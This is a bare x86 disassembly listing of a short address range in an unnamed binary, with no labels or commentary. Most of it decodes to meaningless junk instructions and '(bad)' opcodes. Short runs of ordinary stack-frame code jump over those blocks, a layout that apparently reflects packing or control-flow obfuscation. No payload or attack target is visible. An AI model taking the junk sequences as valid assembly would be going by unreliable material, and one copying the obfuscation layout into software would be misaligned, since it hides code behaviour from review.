  4020c6:	sar    DWORD PTR ds:0x2cfe90aa,cl
  4020cc:	dec    ebx
  4020cd:	rcr    DWORD PTR [ecx+0x633baf47],0xa6
  4020d4:	outs   dx,BYTE PTR ds:[esi]
  4020d5:	dec    esi
  4020d6:	dec    ebx
  4020d7:	or     BYTE PTR [esi],ah
  4020d9:	push   ebp
  4020da:	xlat   BYTE PTR ds:[ebx]
  4020db:	or     dh,dh
  4020dd:	lods   eax,DWORD PTR ds:[esi]
  4020de:	dec    esi
  4020df:	fisub  WORD PTR [eax+0x73]
  4020e2:	scas   eax,DWORD PTR es:[edi]
  4020e3:	push   eax
  4020e4:	icebp  
  4020e5:	imul   esp,DWORD PTR [edx+ecx*2+0x69168aa6],0x77
  4020ed:	test   DWORD PTR [ebp-0x61],ebp
  4020f0:	stc    
  4020f1:	outs   dx,BYTE PTR ds:[esi]
  4020f2:	popa   
  4020f3:	jl     0x402169
  4020f5:	ds (bad) 
  4020f7:	jmp    0x402100
  4020f9:	cmc    
  4020fa:	out    0xf7,eax
  4020fc:	out    dx,eax
  4020fd:	xor    eax,0x903444e6
  402102:	adc    DWORD PTR [edi+0x17cebfd9],0x78
  402109:	lea    eax,[edi]
  40210b:	(bad)  ds:0x61717b8d
  402111:	fisub  DWORD PTR [ecx+0x1b]
  402114:	or     bh,BYTE PTR [eax+ebp*8]
  402117:	int3   
  402118:	sbb    ah,ch
  40211a:	push   esp
  40211b:	push   0x720d9058
  402120:	dec    edx
  402121:	imul   DWORD PTR [esi]
  402123:	or     BYTE PTR [edx+0x579cb47f],dh
  402129:	sub    ch,BYTE PTR [ebx-0x3c344e56]
  40212f:	das    
  402130:	xlat   BYTE PTR ds:[ebx]
  402131:	jle    0x402114
  402133:	sbb    bh,dl
  402135:	mov    ax,0x938d
  402139:	mov    bl,0xa4
  40213b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40213c:	pop    ss
  40213d:	mov    DWORD PTR [ecx],edi
  40213f:	shl    ah,0x7f
  402142:	jg     0x4021bc
  402144:	jne    0x4020e8
  402146:	jmp    0x7557:0x41259d7c
  40214d:	(bad)  [ecx-0x17ba74b0]
  402153:	add    eax,0xaa
  402158:	jmp    0x4022f9
  40215d:	cmc    
  40215e:	dec    ebx
  40215f:	and    eax,0x7570a1be
  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	xchg   ecx,eax
  40216a:	dec    esp
  40216b:	add    BYTE PTR [eax+0x1e],al
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021af
  402176:	fbld   TBYTE PTR [ecx]
  402178:	pushf  
  402179:	addr16 retf 0x2d1
  40217d:	and    edx,DWORD PTR [eax+0x6c]
  402180:	dec    eax
  402181:	inc    ecx
  402183:	or     BYTE PTR [ecx+0x4c4ada66],dl
  402189:	shl    BYTE PTR [edi+ebp*4+0x10cda50c],1
  402190:	push   ebx
  402191:	arpl   WORD PTR [ecx*4+0x263ab81c],bx
  402198:	jmp    0x40217d
  40219a:	out    dx,al
  40219b:	gs pop edi
  40219d:	bound  edx,QWORD PTR [esi]
  40219f:	mov    esp,0xf84ad69e
  4021a4:	fnsave [esi]
  4021a6:	sbb    eax,0xc062c88
  4021ab:	add    DWORD PTR [eax],ebp
  4021ad:	nop
  4021ae:	inc    esi
  4021af:	(bad)  
  4021b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021b1:	cmp    esi,DWORD PTR [edi-0xc]
  4021b4:	and    BYTE PTR [edx+0xfd604c8],ah
  4021ba:	mov    edi,0x79ecc43a
  4021bf:	popf   
  4021c0:	popa   
  4021c1:	mov    WORD PTR [esi-0x6cbaca8b],ds
  4021c7:	rep outs dx,DWORD PTR ds:[esi]
  4021c9:	je     0x40222e
  4021cb:	out    0xdf,al
  4021cd:	adc    edi,esi
  4021cf:	inc    edi
  4021d0:	mov    edi,0x5580bd4d
  4021d5:	lahf   
  4021d6:	add    BYTE PTR [edx-0x3071f537],dl
  4021dc:	shl    BYTE PTR [ecx-0x1f1b467a],cl
  4021e2:	pusha  
  4021e3:	iret   
  4021e4:	pop    ecx
  4021e5:	adc    eax,0xdb2aee6d
  4021ea:	add    al,0xd2
  4021ec:	sbb    DWORD PTR es:[ebp+0x42d76362],0x276f32
  4021f7:	loopne 0x402254
  4021f9:	cwde   
  4021fa:	pusha  
  4021fb:	pusha  
  4021fc:	int    0x3c
  4021fe:	jl     0x40221b
  402200:	or     eax,0xae2319d6
  402205:	xchg   edx,eax
  402206:	lock cmp edx,edx
  402209:	stos   BYTE PTR es:[edi],al
  40220a:	pop    edi
  40220b:	lds    edi,FWORD PTR ds:0xbd3fd203
  402211:	mov    esi,0x50c34e14
  402216:	dec    edx
  402217:	loop   0x4021f5
  402219:	iret   
  40221a:	ret    
  40221b:	stc    
  40221c:	js     0x402295
  40221e:	xchg   BYTE PTR [ebx+0x7e],bh
  402221:	lahf   
  402222:	and    eax,0xcb0b2f88
  402227:	cmp    ecx,edi
  402229:	hlt    
  40222a:	jecxz  0x402224
  40222c:	fnsave [edi-0x28398169]
  402232:	dec    edi
  402233:	jo     0x40229d
  402235:	dec    ecx
  402236:	shl    DWORD PTR [eax+0x6675caee],1
  40223c:	inc    ebx
  40223d:	fidivr DWORD PTR [edx+0x32bb1204]
  402243:	dec    ebp
  402244:	mov    dh,0x70
  402246:	test   eax,0x809a8c42
  40224b:	inc    ecx
  40224c:	cmovns ebx,ebx
  40224f:	push   esp
  402250:	jo     0x40224a
  402252:	jbe    0x402257
  402254:	xchg   esi,esi
  402256:	push   edx
  402257:	sahf   
  402258:	and    DWORD PTR [ecx-0x37],0x5cbe45d0
  40225f:	mov    dh,0xee
  402261:	mov    edx,0xf86e90e1
  402266:	and    al,0xb0
  402268:	fs addr16 inc esp
  40226b:	xchg   ecx,eax
  40226c:	mov    al,ds:0x533a164a
  402271:	je     0x4022ee
  402273:	dec    ebp
  402274:	bound  eax,QWORD PTR [eax-0x41536fa8]
  40227a:	andnps xmm0,XMMWORD PTR [eax+0x2b]
  40227e:	sahf   
  40227f:	push   esp
  402280:	imul   ecx,DWORD PTR [ebx*1-0x57dc67fe],0xffffff83
  402288:	loope  0x40228e
  40228a:	in     al,dx
  40228b:	sahf   
  40228c:	out    dx,eax
  40228d:	lods   al,BYTE PTR ds:[esi]
  40228e:	or     al,0x48
  402290:	in     eax,dx
  402291:	rcr    BYTE PTR [esi+ebx*8+0x71],cl
  402295:	inc    ebx
  402296:	mov    ebx,0xd736996f
  40229b:	test   edi,eax
  40229d:	fcmovu st,st(0)
  40229f:	cmp    BYTE PTR [edi],0xda
  4022a2:	push   edi
  4022a3:	or     edi,0xb6f5618a
  4022a9:	int3   
  4022aa:	mov    edx,?
  4022ac:	stos   DWORD PTR es:[edi],eax
  4022ad:	push   esp
  4022ae:	rep lods eax,DWORD PTR ds:[esi]
  4022b0:	jbe    0x402280
  4022b2:	ror    ebx,0x16
  4022b5:	int    0x84
  4022b7:	push   esp
  4022b8:	in     eax,0x63
  4022ba:	push   ebp
  4022bb:	call   0x4aff:0x492be6bf
  4022c2:	out    dx,eax
  4022c3:	or     DWORD PTR [edi-0x76df4bb9],ebx
  4022c9:	xor    BYTE PTR [ecx-0x3e],0x37
  4022cd:	stc    
  4022ce:	ins    DWORD PTR es:[edi],dx
  4022cf:	int3   
  4022d0:	shl    dh,cl
  4022d2:	add    eax,0xc3db1934
  4022d7:	fst    DWORD PTR [ebx+0x66c11402]
  4022dd:	push   ecx
  4022de:	rcl    DWORD PTR [ebx+edi*2-0x216dea2],1
  4022e5:	xor    ah,bh
  4022e7:	jb     0x402295
  4022e9:	mov    eax,0xac5a28ac
  4022ee:	fwait
  4022ef:	push   ds
  4022f0:	out    0x46,al
  4022f2:	call   0xff7aa73a
  4022f7:	pop    ss
  4022f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022f9:	push   eax
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	lahf   
  402358:	out    dx,eax
  402359:	xlat   BYTE PTR ds:[ebx]
  40235a:	sub    al,0x9a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x402344
  402364:	in     al,dx
  402365:	cld    
  402366:	sbb    dh,BYTE PTR [edx+0x4cb921e3]
  40236c:	icebp  
  40236d:	xchg   edx,eax
  40236e:	and    esp,DWORD PTR [ecx]
  402370:	js     0x402382
  402372:	fs nop
  402374:	in     ax,dx
  402376:	cmc    
  402377:	dec    ebx
  402378:	add    al,BYTE PTR [esi]
  40237a:	mov    edi,0x7c969d6d
  40237f:	ss (bad) 
  402381:	addr16 pop ebx
  402383:	sub    eax,0x69804b02
  402388:	sub    DWORD PTR [edx-0x26],ebp
  40238b:	jnp    0x4023a9
  40238d:	cmp    al,0x30
  40238f:	fwait
  402390:	ret    0x7485
  402393:	cmp    al,0x9a
  402395:	jo     0x4023f9
  402397:	add    esp,DWORD PTR [ecx]
  402399:	outs   dx,BYTE PTR ds:[esi]
  40239a:	aas    
  40239b:	stos   DWORD PTR es:[edi],eax
  40239c:	in     al,dx
  40239d:	inc    edi
  40239e:	(bad)  
  40239f:	gs and eax,0xbe33fcd2
  4023a5:	sbb    al,dh
  4023a7:	mov    WORD PTR [ecx+edx*8],?
  4023aa:	popa   
  4023ab:	jne    0x402389
  4023ad:	pop    esp
  4023ae:	and    al,0x3b
  4023b0:	pop    esp
  4023b1:	pop    ss
  4023b2:	out    0x81,al
  4023b4:	jmp    0x280818f2
  4023b9:	inc    edi
  4023ba:	or     DWORD PTR [eax+0xb],ecx
  4023bd:	fstp   QWORD PTR [ebx-0x9012eb8]
  4023c3:	and    eax,0x90b47850
  4023c8:	out    0xbd,al
  4023ca:	add    ecx,DWORD PTR [edi+eiz*2]
  4023cd:	inc    edx
  4023ce:	stos   DWORD PTR es:[edi],eax
  4023cf:	push   edi
  4023d0:	cmp    DWORD PTR [edx-0x3a],eax
  4023d3:	fmul   st,st(5)
  4023d5:	cmp    BYTE PTR [edx+ecx*1],ch
  4023d8:	cli    
  4023d9:	pop    ebx
  4023da:	in     eax,dx
  4023db:	lods   al,BYTE PTR ds:[esi]
  4023dc:	outs   dx,DWORD PTR ds:[esi]
  4023dd:	push   eax
  4023de:	fistp  DWORD PTR gs:[esi-0x1b8c710b]
  4023e5:	dec    ecx
  4023e6:	shr    DWORD PTR [esi-0x29bb091a],1
  4023ec:	in     al,dx
  4023ed:	xchg   esi,eax
  4023ee:	lock jb 0x402430
  4023f1:	pop    eax
  4023f2:	cmp    eax,0xd7e620db
  4023f7:	pushf  
  4023f8:	sub    esp,ebx
  4023fa:	pop    eax
  4023fb:	cmp    eax,0x74520968
  402400:	dec    esi
  402401:	sub    dh,BYTE PTR [ebx+0x25aeade4]
  402407:	repnz xor eax,0x5654213a
  40240d:	add    ecx,eax
  40240f:	cmp    BYTE PTR [ecx],0x35
  402412:	add    eax,0x6a3ae4b0
  402417:	fsub   QWORD PTR [esi]
  402419:	push   esi
  40241a:	sbb    DWORD PTR [ebx+edx*8-0x3ceddef2],ebp
  402421:	rol    DWORD PTR [ebp-0x339accda],1
  402427:	cmp    al,0x23
  402429:	repz mov al,0x1b
  40242c:	ret    
  40242d:	mov    ch,0xf2
  40242f:	pop    esp
  402430:	cld    
  402431:	pushf  
  402432:	sbb    dh,BYTE PTR ds:0x824ee050
  402438:	sub    al,0x4
  40243a:	in     al,dx
  40243b:	in     eax,0xde
  40243d:	cli    
  40243e:	(bad)  
  40243f:	xor    esp,esp
  402441:	add    BYTE PTR [esi+esi*4],bh
  402444:	icebp  
  402445:	add    dl,ah
  402447:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402448:	inc    ebx
  402449:	inc    ecx
  40244a:	popf   
  40244b:	mov    eax,ds:0x6fa75343
  402450:	inc    ebp
  402451:	sub    dl,BYTE PTR ds:0x2a23bf95
  402457:	xchg   ebx,edi
  402459:	pop    ecx
  40245a:	leave  
  40245b:	push   esi
  40245c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40245d:	jae    0x40249c
  40245f:	cdq    
  402460:	ins    DWORD PTR es:[edi],dx
  402461:	push   edx
  402462:	xor    ch,dl
  402464:	cmp    eax,0x90e3136
  402469:	(bad)  
  40246a:	test   BYTE PTR [ebp-0x536d2526],0xe3
  402471:	pop    es
  402472:	adc    DWORD PTR [ecx+0x72],esp
  402475:	xchg   ebx,eax
  402476:	and    ebp,esp
  402478:	jmp    0x4024a8
  40247a:	(bad)  
  40247b:	dec    esi
  40247c:	push   esp
  40247d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40247e:	xchg   edx,edx
  402480:	outs   dx,BYTE PTR ds:[esi]
  402481:	push   ds
  402482:	lods   al,BYTE PTR ds:[esi]
  402483:	pop    ds
  402484:	jae    0x40249f
  402486:	inc    esp
  402487:	aaa    
  402488:	mov    BYTE PTR [ebp-0x5e],ch
  40248b:	push   edx
  40248c:	inc    eax
  40248d:	push   0x561e2734
  402492:	xor    ah,0x7b
  402495:	adc    dh,ch
  402497:	pop    esp
  402498:	loope  0x4024c4
  40249a:	loop   0x4024fa
  40249c:	or     al,0xa8
  40249e:	xchg   BYTE PTR [edx-0x20b77471],ah
  4024a4:	pmaddwd mm6,mm2
  4024a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024a9:	or     DWORD PTR [ecx-0x476909b5],eax
  4024af:	pop    ss
  4024b0:	mov    ebx,0xc771012a
  4024b5:	and    ah,BYTE PTR [edx+0x10]
  4024b8:	pushf  
  4024b9:	mov    cl,0xc6
  4024bb:	xor    al,0x97
  4024bd:	stos   DWORD PTR es:[edi],eax
  4024be:	pop    edx
  4024bf:	nop
  4024c0:	push   es
  4024c1:	cmovle ebp,DWORD PTR [edi+0x3e047531]
  4024c8:	je     0x4024d9
  4024ca:	dec    edx
  4024cb:	adc    al,0xa7
  4024cd:	inc    edi
  4024ce:	(bad)  
  4024cf:	cdq    
  4024d0:	adc    eax,0xbcfa19cf
  4024d5:	(bad)  
  4024d6:	ins    BYTE PTR es:[edi],dx
  4024d7:	mov    ecx,0x4d74452b
  4024dc:	jnp    0x4024a4
  4024de:	das    
  4024df:	jns    0x4024a6
  4024e1:	pmaxub mm7,QWORD PTR [esi-0x745dcd83]
  4024e8:	inc    ebp
  4024e9:	lock mov DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	push   0x26de62fc
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x4024ae
  40251a:	stos   BYTE PTR es:[edi],al
  40251b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40251c:	mov    esi,DWORD PTR [ecx]
  40251e:	push   esi
  40251f:	f2xm1  
  402521:	aaa    
  402522:	ins    DWORD PTR es:[edi],dx
  402523:	sub    DWORD PTR [esi-0x58],0x6ada815e
  40252a:	jg     0x402597
  40252c:	stos   BYTE PTR es:[edi],al
  40252d:	inc    esi
  40252e:	imul   ebp,DWORD PTR ds:0x7018d1fc,0x507c05ec
  402538:	fucompp 
  40253a:	retf   0xac8
  40253d:	fisttp DWORD PTR [eax]
  40253f:	xchg   esi,eax
  402540:	jle    0x4025a0
  402542:	jle    0x402533
  402544:	pop    edx
  402545:	pop    eax
  402546:	scas   al,BYTE PTR es:[edi]
  402547:	ficom  DWORD PTR [edi]
  402549:	lods   al,BYTE PTR ds:[esi]
  40254a:	lea    esi,[ecx]
  40254c:	mov    BYTE PTR [ecx+eiz*2-0x7e13d8d7],ah
  402553:	shl    BYTE PTR [esi-0x24],cl
  402556:	cmp    eax,0xe207a4ea
  40255b:	sub    ch,ch
  40255d:	cmp    DWORD PTR [edi+ebx*2+0x67],ecx
  402561:	xor    eax,0xdef305b5
  402566:	xchg   ebp,eax
  402567:	cmp    DWORD PTR [edi],eax
  402569:	idiv   DWORD PTR [eax-0x729b7a4d]
  40256f:	mov    edx,0x76297c63
  402574:	ins    DWORD PTR es:[edi],dx
  402575:	push   ds
  402576:	clc    
  402577:	pop    ds
  402578:	pop    es
  402579:	call   0x7614:0x11a5012c
  402580:	mov    ah,0x83
  402582:	adc    ebx,esp
  402584:	add    bh,BYTE PTR [edx+ebx*8]
  402587:	scas   eax,DWORD PTR es:[edi]
  402588:	leave  
  402589:	repnz sub BYTE PTR [edi+0x32b14bb6],cl
  402590:	test   eax,0x249db227
  402595:	in     al,0x37
  402597:	jno    0x402559
  402599:	daa    
  40259a:	ret    0x167c
  40259d:	stos   DWORD PTR es:[edi],eax
  40259e:	lods   eax,DWORD PTR ds:[esi]
  40259f:	cmp    al,0x12
  4025a1:	int3   
  4025a2:	pop    ebp
  4025a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025a4:	push   ds
  4025a5:	cmp    eax,0x540ad028
  4025aa:	xchg   DWORD PTR [esi+0x491da7f2],esp
  4025b0:	into   
  4025b1:	add    DWORD PTR [esp+edi*4+0x26b21194],ebx
  4025b8:	sahf   
  4025b9:	(bad)  
  4025ba:	in     eax,0xc8
  4025bc:	adc    al,0xa1
  4025be:	fwait
  4025bf:	rcr    bh,1
  4025c1:	pop    es
  4025c2:	push   edx
  4025c3:	inc    ecx
  4025c4:	aad    0x50
  4025c6:	retf   
  4025c7:	mov    al,ds:0x4ec11377
  4025cc:	lds    esi,FWORD PTR [edx-0x2]
  4025cf:	ret    0xd7f1
  4025d2:	rol    BYTE PTR [edx+0x43d14b3d],0x59
  4025d9:	pushf  
  4025da:	cwde   
  4025db:	sbb    DWORD PTR [esi-0x8],edx
  4025de:	pop    ebx
  4025df:	adc    DWORD PTR [edx],eax
  4025e1:	test   BYTE PTR [esi],dh
  4025e3:	in     al,dx
  4025e4:	sbb    dl,BYTE PTR [eax+0x47c4c744]
  4025ea:	ret    
  4025eb:	or     cl,BYTE PTR [ecx+0x7e158454]
  4025f1:	pusha  
  4025f2:	inc    ebp
  4025f3:	leave  
  4025f4:	mov    esp,0xe75f491
  4025f9:	xor    edi,DWORD PTR [ebp-0x5]
  4025fc:	xlat   BYTE PTR ds:[ebx]
  4025fd:	mov    ch,0x25
  4025ff:	mov    esi,0x8d959fd1
  402604:	inc    edx
  402605:	or     DWORD PTR [ecx-0x7c],edx
  402608:	jle    0x4025d3
  40260a:	mov    ebx,0x56fb78b9
  40260f:	adc    al,0xe
  402611:	lea    esp,[eax+0x5d0a3bd6]
  402617:	pusha  
  402618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40261a:	sti    
  40261b:	adc    eax,0xd2423270
  402620:	dec    edx
  402621:	call   0xa753:0x1d5804e
  402628:	mov    esi,0x24e9e250
  40262e:	dec    esi
  40262f:	aad    0x5b
  402631:	mov    ch,0x7f
  402633:	pop    edx
  402634:	(bad)  
  402635:	push   edi
  402636:	pop    ebx
  402637:	iret   
  402638:	adc    bh,BYTE PTR [bx+di-0x7f]
  40263c:	clc    
  40263d:	jb     0x4025bf
  40263f:	(bad)  
  402640:	jmp    0x402678
  402642:	pop    ecx
  402643:	neg    bh
  402645:	adc    eax,0xb4504f66
  40264a:	jecxz  0x402617
  40264c:	mov    edx,0x8eef2eb9
  402651:	xchg   ebp,eax
  402652:	pop    ebp
  402653:	cmp    DWORD PTR es:[ecx+ecx*1-0xcc6a138],ebp
  40265b:	add    DWORD PTR [edi+0x459e46b2],esi
  402661:	xlat   BYTE PTR ds:[ebx]
  402662:	inc    edx
  402663:	or     al,0x16
  402665:	pop    esi
  402666:	fadd   DWORD PTR [ebp+ebx*4-0x18]
  40266a:	xchg   edi,eax
  40266b:	jno    0x402663
  40266d:	mov    ch,0x1f
  40266f:	sbb    DWORD PTR [edi],edx
  402671:	stos   BYTE PTR es:[edi],al
  402672:	and    ah,BYTE PTR [eax]
  402674:	cwde   
  402675:	cmp    BYTE PTR [esi-0x3],bh
  402678:	xchg   edi,eax
  402679:	dec    ebp
  40267a:	shr    BYTE PTR [ebx+0x59],cl
  40267d:	fsub   DWORD PTR [edi]
  40267f:	pop    esp
  402680:	cmc    
  402681:	dec    ecx
  402682:	jge    0x4026a8
  402684:	inc    ebp
  402685:	fst    DWORD PTR [ebx]
  402687:	repnz dec ecx
  402689:	pusha  
  40268a:	in     al,0x3
  40268c:	cdq    
  40268d:	sbb    al,0xfe
  40268f:	lock push ss
  402691:	adc    bl,0x72
  402694:	sub    al,0xb4
  402696:	pop    ebp
  402697:	pushf  
  402698:	icebp  
  402699:	push   ebp
  40269a:	pusha  
  40269b:	push   ebx
  40269c:	or     al,0x33
  40269e:	mov    BYTE PTR ds:0x32729b,0x89
  4026a5:	add    DWORD PTR [ebx+0x4d8bdc45],ecx
  4026ab:	clc    
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	add    BYTE PTR [edx+0xea257a5],ch
  4026d8:	jle    0x402758
  4026da:	cli    
  4026db:	jg     0x40275b
  4026dd:	jle    0x4026fb
  4026df:	push   ds
  4026e0:	sub    BYTE PTR [eax-0x31],bl
  4026e3:	or     BYTE PTR [ebp-0x43e1754d],bl
  4026e9:	or     DWORD PTR [ebx],0x47
  4026ec:	cmc    
  4026ed:	outs   dx,BYTE PTR ds:[esi]
  4026ee:	(bad)  
  4026ef:	fstp   DWORD PTR [esi]
  4026f1:	pop    esi
  4026f2:	inc    ecx
  4026f3:	push   ds
  4026f4:	ret    
  4026f5:	fwait
  4026f6:	xor    bh,BYTE PTR [edi-0x384812bf]
  4026fc:	daa    
  4026fd:	jae    0x4026c7
  4026ff:	mov    dh,0x7d
  402701:	imul   edi,DWORD PTR [esi],0xae9eab1f
  402707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402708:	repnz sbb bl,al
  40270b:	mov    ebx,0x7286c5a4
  402710:	test   BYTE PTR [ecx+0x3],bl
  402713:	mov    ds:0x66357b78,eax
  402718:	dec    edi
  402719:	fist   DWORD PTR [ebx+0x6cbe71ca]
  40271f:	fsubr  st(2),st
  402721:	mov    bh,0x87
  402723:	div    BYTE PTR [esi-0x7d5d0b72]
  402729:	imul   esi,DWORD PTR [edx-0x6b],0x33
  40272d:	mov    ds:0x21509d59,al
  402732:	push   edi
  402733:	popa   
  402734:	jnp    0x4026e8
  402736:	push   ecx
  402737:	retf   
  402738:	inc    ecx
  402739:	jg     0x40279c
  40273b:	stos   BYTE PTR es:[edi],al
  40273c:	pop    edx
  40273d:	ret    
  40273e:	es pop eax
  402740:	in     al,0xab
  402742:	rol    DWORD PTR [edi-0x2e43f2a6],cl
  402748:	iret   
  402749:	xchg   esi,eax
  40274a:	sbb    dl,BYTE PTR [edx+edx*2-0x50c520c]
  402751:	xchg   ebp,eax
  402752:	push   edi
  402753:	ins    BYTE PTR es:[edi],dx
  402754:	lds    ebp,FWORD PTR [eax]
  402756:	inc    ecx
  402757:	outs   dx,DWORD PTR ds:[esi]
  402758:	std    
  402759:	bnd jge 0x402742
  40275c:	adc    al,0x63
  40275e:	xor    eax,0x1b53354a
  402763:	xor    DWORD PTR [edi+0x46],edi
  402766:	adc    al,0xa4
  402768:	and    bh,bl
  40276a:	cmp    BYTE PTR [edi],0x6e
  40276d:	jne    0x402704
  40276f:	call   0x6702f694
  402774:	(bad)
  402779:	adc    cl,BYTE PTR [eax-0x14]
  40277c:	or     eax,0x7cd9f582
  402781:	jo     0x402728
  402783:	in     eax,0x98
  402785:	ins    BYTE PTR es:[edi],dx
  402786:	cmc    
  402787:	pavgw  mm1,QWORD PTR [eax-0xd]
  40278b:	enter  0xd60c,0x5c
  40278f:	or     ebp,DWORD PTR [edi-0x7f905b47]
  402795:	cwde   
  402796:	mov    ebp,0x137583a1
  40279b:	dec    ebx
  40279c:	es or  eax,0x5741b20b
  4027a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027a3:	inc    ecx
  4027a4:	mov    ?,WORD PTR [esi+0x790df094]
  4027aa:	mov    al,ds:0xb119df72
  4027af:	dec    esp
  4027b0:	inc    ecx
  4027b1:	jae    0x402803
  4027b3:	and    edi,ecx
  4027b5:	jmp    DWORD PTR [ebp+0x253387c4]
  4027bb:	pop    esp
  4027bc:	pop    es
  4027bd:	pushf  
  4027be:	(bad)  
  4027bf:	jl     0x402750
  4027c1:	mov    cl,0x99
  4027c3:	inc    edi
  4027c4:	mov    esp,0x26031261
  4027c9:	shl    BYTE PTR [esi],cl
  4027cb:	sbb    DWORD PTR [eax+eax*4-0x5f],0x47
  4027d0:	sub    DWORD PTR ds:0x640e305e,edi
  4027d6:	popf   
  4027d7:	out    dx,eax
  4027d8:	pop    eax
  4027d9:	(bad)  
  4027da:	sbb    eax,0xdac91631
  4027df:	fucomi st,st(3)
  4027e1:	pop    ecx
  4027e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027e3:	push   0xeae3485
  4027e8:	adc    al,0x40
  4027ea:	rcl    al,1
  4027ec:	mov    al,0x9
  4027ee:	jmp    0xd097:0x8c566a2a
  4027f5:	and    eax,0x8e0e44eb
  4027fa:	xor    ah,al
  4027fc:	mov    cl,0x90
  4027fe:	loopne 0x40278d
  402800:	lock dec esp
  402802:	push   esp
  402803:	xchg   ecx,eax
  402804:	pop    edx
  402805:	pop    edi
  402806:	inc    ebp
  402807:	mov    esi,0xd22c5a58
  40280c:	aas    
  40280d:	outs   dx,DWORD PTR ds:[esi]
  40280e:	pop    ebp
  40280f:	xchg   esp,eax
  402810:	pushf  
  402811:	nop
  402812:	daa    
  402813:	icebp  
  402814:	mov    al,0xc9
  402816:	pop    ebp
  402817:	fnsavew ds:0x6390d6dd
  40281e:	and    dh,dl
  402820:	mov    cl,0xc6
  402822:	jmp    0x4027c9
  402824:	cwde   
  402825:	sbb    BYTE PTR [edi+0x49ca80dc],0xfe
  40282c:	(bad)  
  40282d:	out    0xf3,al
  40282f:	inc    ebx
  402830:	sar    DWORD PTR [edx],0x3b
  402833:	xchg   esp,eax
  402834:	aaa    
  402835:	adc    ah,BYTE PTR [ebx]
  402837:	ret    0x74a3
  40283a:	sub    al,0xa8
  40283c:	test   BYTE PTR [ecx],dl
  40283e:	(bad)  
  40283f:	sbb    al,0x50
  402841:	dec    edx
  402842:	jae    0x402878
  402844:	js     0x40282f
  402846:	xor    al,0x50
  402848:	sbb    eax,DWORD PTR [ecx]
  40284a:	(bad)  
  40284b:	xor    DWORD PTR [ebx+0x33],ebp
  40284e:	pusha  
  40284f:	push   esi
  402850:	js     0x4028aa
  402852:	outs   dx,DWORD PTR ds:[esi]
  402853:	ds repz dec esi
  402856:	mov    eax,0xccbfae40
  40285b:	xchg   edx,eax
  40285c:	aad    0xe0
  40285e:	mov    ebp,0x8be1f3c4
  402863:	inc    ebp
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	mov    bl,0x63
  402885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
